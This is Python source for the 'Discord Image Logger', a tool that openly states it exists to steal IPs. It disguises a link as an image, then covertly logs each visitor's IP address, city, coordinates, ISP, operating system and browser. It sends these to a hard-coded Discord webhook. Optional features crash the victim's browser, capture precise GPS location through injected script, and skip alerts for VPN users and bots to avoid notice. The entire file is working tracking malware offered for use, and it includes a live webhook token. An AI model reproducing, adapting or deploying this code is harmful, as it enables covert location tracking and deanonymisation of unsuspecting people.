# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1515460624593846272/8qOpelm7ivrmz3t38LF15XAInxaIXraVqzsjMlloYAkHFOSyJJLp_ENoB3oLIqKX0eUi",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
